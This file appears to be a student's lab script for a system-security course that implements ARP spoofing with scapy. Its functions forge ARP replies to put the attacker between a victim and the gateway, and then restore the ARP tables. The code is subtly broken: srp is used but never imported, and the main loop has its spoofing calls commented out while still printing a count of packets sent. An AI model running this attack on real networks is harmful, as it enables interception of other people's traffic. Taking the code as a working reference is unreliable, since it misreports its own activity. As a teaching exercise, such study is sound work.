# Experiment 6: ARP Spoofing
# Course: System Security Lab (CSL604)
# Name: Amey Thakur (https://github.com/Amey-Thakur)
# Roll No: 50
# Batch: B3
# Repository: https://github.com/Amey-Thakur/CRYPTOGRAPHY-AND-SYSTEM-SECURITY-AND-SYSTEM-SECURITY-LAB
# Date: April 20, 2021

"""
Experiment 6: Implement ARP spoofing using Ettercap.

Description:
This script demonstrates the concept of ARP Spoofing (Man-in-the-Middle) programmatically 
using the 'scapy' library. While the experiment uses Ettercap (a GUI tool), this script 
explains the underlying mechanism of sending forged ARP responses.

Mechanism:
1. The attacker sends a spoofed ARP response to the Target (Victim), claiming to be the Router (Gateway).
2. The attacker sends a spoofed ARP response to the Router (Gateway), claiming to be the Target (Victim).
3. Packets between Target and Router now flow through the Attacker's machine.

Requirements:
- Python 3.x
- scapy (pip install scapy)
- Run as Administrator/Root

Usage:
> sudo python ARP_Spoofer.py
"""

import time
import sys
from scapy.all import ARP, Ether, send

def get_mac(ip):
    """
    Returns MAC address of a given IP.
    Detailed steps:
    1. Create an ARP request asking "Who has this IP?"
    2. Broadcast it using Ether layer.
    3. Send packet and wait for response.
    """
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    """
    Sends a spoofed ARP packet.
    Arguments:
    target_ip -- The victim's IP address (who we are fooling).
    spoof_ip  -- The IP address we are pretending to be (e.g., Gateway).
    """
    # op=2 stands for ARP Response (is-at)
    # We don't specify MAC, scapy puts our MAC by default as source.
    # We tell target_ip that spoof_ip is at OUR MAC address.
    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    send(packet, verbose=False)

def restore(destination_ip, source_ip):
    """
    Restores the ARP tables to their original state (cleanup).
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # Send 4 times to ensure it's received
    send(packet, count=4, verbose=False)

if __name__ == "__main__":
    # Example Configuration (Do not run on unauthorized networks)
    target_ip = "192.168.1.5"  # Victim IP
    gateway_ip = "192.168.1.1" # Router IP
    
    print(f"[-] Running ARP Spoofer against {target_ip}...")
    try:
        sent_packets_count = 0
        while True:
            # Tell Victim I am Router
            # spoof(target_ip, gateway_ip)
            # Tell Router I am Victim
            # spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print(f"\r[+] Packets sent: {sent_packets_count}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] Detected CTRL + C ... Resetting ARP tables ... Please wait.")
        # restore(target_ip, gateway_ip)
        # restore(gateway_ip, target_ip)
